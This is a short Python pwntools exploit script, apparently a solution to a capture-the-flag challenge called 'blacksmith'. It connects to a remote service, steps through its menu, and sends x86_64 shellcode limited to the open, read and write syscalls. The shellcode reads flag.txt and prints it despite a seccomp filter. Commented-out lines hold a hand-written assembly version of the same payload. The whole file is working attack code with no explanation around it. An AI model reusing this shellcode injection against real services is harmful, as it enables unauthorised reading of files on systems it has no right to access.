from pwn import *

context.arch = 'x86_64'

# p = process('./blacksmith')
p = remote('188.166.168.204', 30153)
print(p.recv())
p.sendline('1')
print(p.recv())
p.sendline('2')
print(p.recv())
#seccomp is messing with us - not working
#checking syscalls for read,write,open,exit
# payload = asm(shellcraft.amd64.linux.readfile('flag.txt', 1))
# BUF = 0x101080
FLAG_LEN = 30
code = shellcraft.amd64.linux.syscalls.open('flag.txt')
code += shellcraft.amd64.linux.syscalls.read('rax', 'rsp', FLAG_LEN)
code += shellcraft.amd64.linux.syscalls.write(1, 'rsp', FLAG_LEN)
# code = '''
#     /* open(file='flag.txt', oflag=0, mode=0) */
#     /* push b'flag.txt\\x00' */
#     push 0
#     mov rax, 0x7478742e67616c66
#     mov rdi, rsp
#     xor edx, edx /* 0 */
#     xor esi, esi /* 0 */
#     /* call open() */
#     push SYS_open /* 2 */
#     syscall
#     /* read(fd='rax', buf=0x101080, nbytes=5) */
#     mov rdi, rax
# 	mov rdx, 5
#     mov esi, 0x101080
#     /* call read() */
#     xor eax, eax /* SYS_read */
#     syscall
#     /* write(fd=1, buf=0x101080, n=5) */
#     mov rdi, 1
#     mov rdx, 5
#     mov esi, 0x101080
#     /* call write() */
#     mov rax, SYS_write
#     syscall
# '''

payload = asm(code)
# gdb.attach(p)
print(f"Payload length: {len(payload)}")
if (len(payload) > 63):
    print("PAYLOAD TOO LONG!")
p.sendline(payload)
print(p.recv())
print(p.recv())

#shellcraft.amd64.linux.syscalls.open('flag.txt')
#fd is in rax
#buf is 0x101080 (maybe)
